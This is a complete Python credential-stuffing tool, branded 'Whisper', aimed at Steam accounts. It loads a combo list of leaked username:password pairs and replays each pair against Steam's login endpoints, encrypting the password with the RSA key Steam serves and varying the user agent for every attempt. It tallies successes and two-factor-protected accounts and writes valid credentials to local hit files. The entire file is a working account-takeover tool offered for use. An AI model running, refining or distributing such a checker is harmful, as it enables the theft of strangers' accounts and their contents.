import requests,time,json,rsa,urllib,base64,os
from user_agent import generate_user_agent as ua
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
SS = '\033[1;33m'
ok=0
fa=0
wp=0
wu=0
logo=(f'''{G} _    _ _     _                     
{G}| |  | | |   (_)                    
{G}| |  | | |__  _ ___ _ __   ___ _ __ 
{G}| |/\| | '_ \| / __| '_ \ / _ \ '__|
{G}\  /\  / | | | \__ \ |_) |  __/ |   
{G} \/  \/|_| |_|_|___/ .__/ \___|_|   
{G}                   | |              
{G}                   |_|              
{G}[G] GitHub    : {B}@whisper-666
{G}[I] InstaGram : {B}@Whisper_DEV
{G}[F] FaceBook  : {B}@WHISPER.DZA
{G}[T] TeleGram  : {B}@WHI3PER''')
def msg(US,pwass):
 global ok,fa,wu,wp
 os.system('clear')
 print(logo)
 print(f'{B}ـ'*40)
 print(f'''{G}[√] Hit : {B}{ok}
{B}[=] 2FA : {SS}{fa}
{SS}[*] Repeat : {E}{wu}
{SS}[×] Wrong : {E}{wp}''')
 print(f'{B}ـ'*40)
 print(f'{SS}[+] {B}{US} {SS}| {B}{pwass}')
 print(f'{B}ـ'*40)
def steam(US,pwass):
 global ok,fa,wu,wp
 S = ua()
 _0 = str(int(time.time()))
 data = {
    "donotcache": _0,
    "username": US
}
 headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://steamcommunity.com",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": S,
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-us"
}
 response = requests.post("https://steamcommunity.com/login/getrsakey/", data=data, headers=headers)
 SOURCE = response.text
 publickey_mod = json.loads(SOURCE)["publickey_mod"]
 publickey_exp = json.loads(SOURCE)["publickey_exp"]
 timestamp = json.loads(SOURCE)["timestamp"]
 key = rsa.PublicKey(int(publickey_mod, 16), int(publickey_exp, 16))
 PASS2 = rsa.encrypt(pwass.encode(), key)
 PASS3 = urllib.parse.quote(base64.b64encode(PASS2).decode())
 _0 = str(int(time.time()))
 data = {
    "donotcache": _0,
    "password": PASS3,
    "username": US,
    "twofactorcode": "",
    "emailauth": "",
    "loginfriendlyname": "",
    "captchagid": "-1",
    "captcha_text": "",
    "emailsteamid": "",
    "rsatimestamp": timestamp,
    "remember_login": "false",
    "oauth_client_id": "3638BFB1"
}
 headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://steamcommunity.com",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": S,
    "Referer": "https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-us"
}
 response = requests.post("https://steamcommunity.com/login/dologin/", data=data, headers=headers)
 SOURCE = response.text
 if "The account name or password that you have entered is incorrect" in SOURCE or "Incorrect account name or password." in SOURCE:
#    print(f"{E}[×] Wrong : {SS}{US} | {pwass}")
    wp+=1
    msg(US,pwass)
 elif "success\":true" in SOURCE:
#    print(f"{G}[√] Hit : {B}{US} | {pwass}")
    ok+=1
    msg(US,pwass)
    with open('Hit-Steam.txt','a+') as whisper:
     whisper.write(f'{US}:{pwass}\n\n')
 elif "requires_twofactor\":true,\"" in SOURCE or "emailauth_needed\":true" in SOURCE:
#    print(f"{B}[√] 2FA : {SS}{US} | {pwass}")
    fa+=1
    msg(US,pwass)
    with open('2FA-Steam.txt','a+') as whisper:
     whisper.write(f'{US}:{pwass}\n\n')
 elif "captcha_needed\":true" in SOURCE:
    print(f"{E}[×] Captcha : {SS}{US} | {pwass}")
 elif 'null' in SOURCE:
  wu+=1
  msg(US,pwass)
  steam(US,pwass)
 else:
  print(SOURCE)
os.system('clear')
print(logo)
print(f'{E}ـ'*40)
path=input(f'{B}[+] Combo List Path : {G}')
print(f'{E}ـ'*40)
try:
 for whis in open(path,'r').read().splitlines():
  acc=str(whis)
  acc=acc.split('\n')[0]
  US=acc.split(':')[0]
  pwass=acc.split(':')[1].split(' ')[0]
  steam(US,pwass)
except:
 pass